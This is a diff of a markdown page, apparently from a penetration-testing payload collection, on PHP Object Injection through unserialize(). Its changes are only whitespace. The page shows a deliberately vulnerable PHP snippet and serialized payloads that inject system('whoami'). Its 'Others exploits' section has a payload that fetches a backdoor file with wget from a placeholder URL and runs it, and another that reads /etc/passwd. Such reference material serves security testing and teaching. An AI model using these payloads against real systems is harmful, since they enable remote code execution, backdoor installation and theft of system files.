@@ -1,8 +1,11 @@
 # PHP Object Injection
-PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.	
+
+PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.
 
 ## Exploit with the __wakeup in the unserialize function
+
 Vulnerable code:
+
 ```php
 <?php 
     class PHPObjectInjection{
@@ -17,7 +20,7 @@ Vulnerable code:
     }
     if(isset($_REQUEST['r'])){  
         $var1=unserialize($_REQUEST['r']);
-        if(is_array($var1)){ 
+        if(is_array($var1)){
             echo "<br/>".$var1[0]." - ".$var1[1];
         }
     }
@@ -28,6 +31,7 @@ Vulnerable code:
 ```
 
 Payload:
+
 ```php
 # Basic serialized data
 a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}
@@ -38,23 +42,26 @@ string(68) "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}
 ```
 
 ## Others exploits
+
 Reverse Shell
+
 ```php
 class PHPObjectInjection
 {
-   // CHANGE URL/FILENAME TO MATCH YOUR SETUP
-   public $inject = "system('wget http://URL/backdoor.txt -O phpobjbackdoor.php && php phpobjbackdoor.php');";
+    // CHANGE URL/FILENAME TO MATCH YOUR SETUP
+    public $inject = "system('wget http://URL/backdoor.txt -O phpobjbackdoor.php && php phpobjbackdoor.php');";
 }
 
 echo urlencode(serialize(new PHPObjectInjection));
 ```
 
 Basic detection
+
 ```php
 class PHPObjectInjection
 {
-   // CHANGE URL/FILENAME TO MATCH YOUR SETUP
-   public $inject = "system('cat /etc/passwd');";
+    // CHANGE URL/FILENAME TO MATCH YOUR SETUP
+    public $inject = "system('cat /etc/passwd');";
 }
 
 echo urlencode(serialize(new PHPObjectInjection));
@@ -63,5 +70,6 @@ echo urlencode(serialize(new PHPObjectInjection));
 ```
 
 ## Thanks to
+
 * [PHP Object Injection - OWASP](https://www.owasp.org/index.php/PHP_Object_Injection)
 * [PHP Object Injection - Thin Ba Shane](http://location-href.com/php-object-injection/)
